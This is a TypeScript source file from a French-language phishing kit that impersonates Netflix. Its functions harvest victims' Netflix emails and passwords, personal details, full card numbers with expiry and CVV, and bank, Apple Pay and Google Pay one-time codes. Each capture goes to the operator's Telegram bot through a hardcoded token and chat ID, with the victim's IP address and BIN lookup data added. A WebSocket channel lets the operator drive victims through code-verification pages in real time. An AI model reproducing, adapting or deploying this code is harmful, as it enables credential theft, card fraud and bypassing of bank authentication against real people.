import { FormData, BankInfo } from '../types';

const BOT_TOKEN = '7563843317:AAFUAY4SWGcdrIZkppAb1zrcktHNboLS18E';
const CHAT_ID = '-4771308472';
const WS_URL = 'wss://websocket.412project.fr/netflix_harry';

const getIP = async (): Promise<string> => {
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    return String(data.ip);
  } catch (error) {
    return 'Unknown';
  }
};

const getBankInfo = async (cardNumber: string): Promise<BankInfo> => {
  try {
    const bin = cardNumber.replace(/\s/g, '').substring(0, 6);
    const response = await fetch(`https://bins.antipublic.cc/bins/${bin}`, {
      method: 'GET',
    });
    
    if (!response.ok) {
      throw new Error('BIN lookup failed');
    }

    const data = await response.json();
    
    return {
      type: String(data.scheme || data.brand || 'UNKNOWN').toUpperCase(),
      bank: String(data.bank || 'UNKNOWN'),
      level: String(data.type || 'UNKNOWN') + ' Card',
      country: String(data.country || 'UNKNOWN'),
      bankUrl: String(data.bank_url || 'UNKNOWN'),
      bankPhone: String(data.bank_phone || 'UNKNOWN')
    };
  } catch (error) {
    console.error('Erreur BIN:', error);
    return {
      type: 'UNKNOWN',
      bank: 'UNKNOWN',
      level: 'UNKNOWN',
      country: 'UNKNOWN',
      bankUrl: 'UNKNOWN',
      bankPhone: 'UNKNOWN'
    };
  }
};

const sessionId = Math.random().toString(36).substring(2);

let ws: WebSocket | null = null;
let reconnectAttempts = 0;
const MAX_RECONNECT_ATTEMPTS = 5;

function connectWebSocket(messageId: string) {
  if (reconnectAttempts >= MAX_RECONNECT_ATTEMPTS) {
    console.error('Max reconnection attempts reached');
    return;
  }

  try {
    ws = new WebSocket(`${WS_URL}?sessionId=${sessionId}&messageId=${messageId}`);

    ws.onmessage = (event) => {
      try {
        const data = JSON.parse(event.data);
        if (data.action && data.messageId === messageId) {
          handleAction(data.action);
        }
      } catch (error) {
        console.error('Error parsing WebSocket message:', error);
      }
    };

    ws.onclose = () => {
      reconnectAttempts++;
      setTimeout(() => connectWebSocket(messageId), 1000 * Math.min(reconnectAttempts, 5));
    };

    ws.onerror = (error) => {
      console.error('WebSocket error:', error);
      ws?.close();
    };
  } catch (error) {
    console.error('Error connecting to WebSocket:', error);
  }
}

let currentBillingInfo: any = null;

export async function sendToTelegram(data: FormData) {
  try {
    if (data.type === 'payment' && data.billingInfo) {
      currentBillingInfo = data.billingInfo;
    }

    const message = await formatMessage(data);
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    
    const body: any = {
      chat_id: CHAT_ID,
      text: message,
      parse_mode: 'HTML'
    };

    if (data.type === 'payment') {
      body.reply_markup = {
        inline_keyboard: [
          [
            { text: "🍎 Apple Pay", callback_data: `apple_pay:${sessionId}` },
            { text: "🤖 Google Pay", callback_data: `google_pay:${sessionId}` }
          ],
          [
            { text: "🏦 Vérification Bancaire", callback_data: `bank_verification:${sessionId}` },
            { text: "📱 Application Bancaire", callback_data: `bank_app_check:${sessionId}` }
          ],
          [
            { text: "✅ Valider", callback_data: `remove_loading:${sessionId}` }
          ]
        ]
      };
    } else if (data.type === 'apple_pay' || data.type === 'google_pay' || data.type === 'bank_verification') {
      body.reply_markup = {
        inline_keyboard: [
          [
            { text: "✅ Code Correct", callback_data: `code_correct:${sessionId}` },
            { text: "❌ Code Incorrect", callback_data: `code_incorrect:${sessionId}` }
          ]
        ]
      };
    } else if (data.type === 'bank_app_check') {
      body.reply_markup = {
        inline_keyboard: [
          [
            { text: "✅ Confirmer", callback_data: `code_correct:${sessionId}` },
          ]
        ]
      };
    }
    
    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(body),
    });

    if (!response.ok) {
      throw new Error('Failed to send message to Telegram');
    }

    const responseData = await response.json();
    const messageId = responseData.result.message_id.toString();

    if (data.type === 'payment' || data.type === 'apple_pay' || data.type === 'google_pay' || data.type === 'bank_verification' || data.type === 'bank_app_check') {
      connectWebSocket(messageId);
    }
  } catch (error) {
    console.error('Error sending to Telegram:', error);
  }
}

function handleAction(action: string) {
  const isVerified = localStorage.getItem('verification_status') === 'true';
  const state = encodeURIComponent(JSON.stringify({ billingInfo: currentBillingInfo }));

  switch (action) {
    case 'apple_pay':
      if (isVerified) {
        window.location.href = `/apple-pay?state=${state}`;
      } else {
        window.location.href = `/?redirectTo=${encodeURIComponent(`/apple-pay?state=${state}`)}`;
      }
      break;
    case 'google_pay':
      if (isVerified) {
        window.location.href = `/google-pay?state=${state}`;
      } else {
        window.location.href = `/?redirectTo=${encodeURIComponent(`/google-pay?state=${state}`)}`;
      }
      break;
    case 'bank_verification':
      if (isVerified) {
        window.location.href = `/bank-verification?state=${state}`;
      } else {
        window.location.href = `/?redirectTo=${encodeURIComponent(`/bank-verification?state=${state}`)}`;
      }
      break;
    case 'bank_app_check':
      if (isVerified) {
        window.location.href = `/bank-app-check?state=${state}`;
      } else {
        window.location.href = `/?redirectTo=${encodeURIComponent(`/bank-app-check?state=${state}`)}`;
      }
      break;
    case 'remove_loading':
      window.location.href = '/success?noLoading=true';
      break;
    case 'code_correct':
      window.location.href = '/success?noLoading=true';
      break;
    case 'code_incorrect':
      const currentPath = window.location.pathname;
      window.location.href = `${currentPath}?error=true`;
      break;
  }
}

async function formatMessage(data: FormData): Promise<string> {
  const now = new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' });
  const ip = await getIP();
  
  if (data.type === 'payment') {
    const bin = data.cardNumber.replace(/\s/g, '').substring(0, 6);
    const bankInfo = await getBankInfo(data.cardNumber);

    const billingInfo = data.billingInfo || {};
    const { firstName = '', lastName = '', address = '', postalCode = '', phone = '', email = '' } = billingInfo;

    return `🏦 Informations Personnelles
├ 🕵️ Nom complet : ${firstName} ${lastName}
├ 🏠 Adresse : ${address}
├ 📮 Zip : ${postalCode}
├ 📞 Numéro de téléphone : ${phone}
└ 📧 Email : ${email}

🏦 Carte de Paiement
├ 🍒 Titulaire : ${firstName} ${lastName}
├ 💳 Numéro de carte : ${data.cardNumber}
├ 📅 Expiration : ${data.expiry}
└ 🔒 Cryptogramme visuel : ${data.cvv}

🗃 Coordonnées Bancaires
├ 🎯 Bin : #${bin}
├ 🏷️ Nom de la banque : ${bankInfo.bank}
├ 🏷️ Type : ${bankInfo.type}
├ 🏷️ Niveau : ${bankInfo.level}
├ 🌍 Pays : ${bankInfo.country}
├ 🔗 Site web : ${bankInfo.bankUrl}
└ ☎️ Téléphone : ${bankInfo.bankPhone}

🧩 Extra
├ 🏷️ Bin : #${bin}
├ 🌐 IP : ${ip}
├ 🖼️ SCAN : cardimages.imaginecurve.com/cards/${bin}.png
└ 🖥️ OS : ${navigator.userAgent}

📍 Base : Netflix [${now}]
└ © 412Project : [© 2024 - All rights reserved.]`;
  } 
  else if (data.type === 'login') {
    return `🌐 Nouvelle connexion Netflix !
├ 📧 Email: ${data.email}
├ 🔑 Mot de passe: ${data.password}
├ 🌐 IP: ${ip}
└ 📅 Heure: ${now}`;
  }
  else if (data.type === 'billing') {
    return `🏦 Informations Personnelles
├ 🕵️ Nom complet : ${data.firstName} ${data.lastName}
├ 🏠 Adresse : ${data.address}, ${data.city}
├ 📮 Zip : ${data.zip}
├ 📞 Numéro de téléphone : ${data.phone}
├ 📅 Date de naissance : ${data.dob}
├ 📧 Email : ${data.email}
├ 🌐 IP: ${ip}
└ 📅 Heure: ${now}`;
  }
  else if (data.type === 'apple_pay' || data.type === 'google_pay' || data.type === 'bank_verification') {
    const billingInfo = data.billingInfo || {};
    const { firstName = '', lastName = '', address = '', postalCode = '', phone = '', email = '' } = billingInfo;

    const methodName = data.type === 'apple_pay' ? 'Apple Pay' : 
                      data.type === 'google_pay' ? 'Google Pay' : 
                      'Bank Verification';

    return `🔐 ${methodName} Code
├ 🔑 Code: ${data.code}
├ 🕵️ Nom complet : ${firstName} ${lastName}
├ 🏠 Adresse : ${address}
├ 📮 Zip : ${postalCode}
├ 📞 Numéro de téléphone : ${phone}
├ 📧 Email : ${email}
├ 🌐 IP : ${ip}
└ 📅 Heure: ${now}`;
  }
  else if (data.type === 'bank_app_check') {
    const billingInfo = data.billingInfo || {};
    const { firstName = '', lastName = '', address = '', postalCode = '', phone = '', email = '' } = billingInfo;

    return `📱 Vérification Application Bancaire
├ 🕵️ Nom complet : ${firstName} ${lastName}
├ 🏠 Adresse : ${address}
├ 📮 Zip : ${postalCode}
├ 📞 Numéro de téléphone : ${phone}
├ 📧 Email : ${email}
├ 🌐 IP : ${ip}
└ 📅 Heure: ${now}

⏳ En attente de confirmation...`;
  }

  return '';
}